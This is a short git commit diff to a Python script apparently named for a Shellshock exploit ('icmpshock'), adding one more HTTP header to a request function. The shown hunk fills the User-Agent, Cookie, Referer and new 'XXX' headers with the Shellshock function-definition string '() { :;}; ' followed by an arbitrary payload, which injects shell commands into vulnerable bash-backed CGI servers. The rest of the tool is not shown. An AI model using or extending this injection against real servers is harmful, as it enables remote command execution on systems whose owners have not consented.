d908ad5836d60a8b7f4b9e364cde6718d25656f7
JohnRyk <983935575@qq.com>
2021-08-23 15:21:17 +0800

    Second commit

--- python3_icmpshock.py
+++ python3_icmpshock.py
@@ -42,6 +42,7 @@ def send_req(t_url,payload,method="POST"):
         "User-Agent": "() { :;}; %s" % payload, \
         "Cookie": "() { :;}; %s" % payload, \
         "Referer": "() { :;}; %s" % payload, \
+        "XXX": "() { :;}; %s" % payload, \
         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",\
         "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", \
         "Accept-Encoding": "gzip, deflate",\
